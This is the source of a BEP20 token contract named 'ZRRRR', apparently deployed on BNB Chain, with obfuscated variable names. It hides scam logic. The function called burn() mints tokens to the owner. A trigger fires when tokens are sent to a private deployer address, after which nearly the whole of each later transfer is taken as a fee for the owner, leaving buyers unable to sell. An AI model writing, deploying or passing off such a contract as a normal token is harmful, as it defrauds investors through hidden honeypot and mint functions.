/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.5.11;
contract RZaHil {
uint256 public  lJxQRf = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  gbcjSj = 10000000000000000;
uint256 public  pZtpSz = 100000000000000000;
address public  yOAuzU = address(0);
mapping (address => uint256) public balanceOf;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "ZRRRR";
uint256 public  VLJzvw = 10000000000000000000000000000;
address public  aLWSis = address(0);
uint256 private  KgqLQJ = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  QuqVHw = 100000000000000000000;
address public  CUhBKM = address(0);
address public  FfwCRa = address(0);
address public owner;
uint256 public  PWVDBu = 100000000000000000000000;
uint256 public constant EAwMgx = 73999;
address private  wYKCXY = address(0);
address public  CufaMQ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "ZRRRR";
uint256 public  OvqalD = 100000000000000000000000;
uint256 public  EhaptS = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  vSbjmb = address(0);
uint8 public constant decimals = 18;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
receive() external payable {}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
wYKCXY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WKfSSJ");
require(to != address(0), "WKfSSJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* EAwMgx/KgqLQJ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==wYKCXY){
KgqLQJ = 73999+1;
}
emit Transfer(from, to, transferAmount);
}

}